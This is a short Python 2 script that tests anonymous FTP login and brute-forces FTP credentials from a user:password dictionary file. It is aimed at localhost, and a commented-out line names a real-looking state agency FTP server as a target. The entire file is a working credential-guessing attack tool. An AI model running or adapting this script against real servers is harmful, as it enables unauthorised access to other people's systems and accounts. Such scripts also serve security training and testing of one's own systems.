import ftplib

def anonLogin(hostname):
	try:
		ftp = ftplib.FTP(hostname)
		ftp.login('Anonymous', 'me@your.com')
		print '[*] ' + str(hostname) + ' FTP Anonymous Logon Succeeded.'
		ftp.quit()
		return True
	except Exception, e:
		print '[-] ' + str(hostname) + ' FTP Anonymous Logon Failed.'
		return False

def bruteLogin(hostname, passwdFile):
	pF = open(passwdFile, 'r')
	for line in pF:
		userName = line.split(':')[0]
		passWord = line.split(':')[1].strip('\r').strip('\n')
		print "[+] Trying: "+userName+"/"+passWord
		try:
			ftp = ftplib.FTP(hostname)
			ftp.login(userName, passWord)
			print '[*] ' + str(hostname) +' FTP Logon Succeeded: '+userName+"/"+passWord
			ftp.quit()
			return
		except Exception, e:
			print '[*] ' + str(hostname) +' FTP Logon Failed: '+userName+"/"+passWord 
	print '[-] Could not brute force FTP credentials.'
	return

#host = 'ftp.swfwmd.state.fl.us'
host = '127.0.0.1'
passwdFile = 'dictt.txt'
bruteLogin(host, passwdFile)
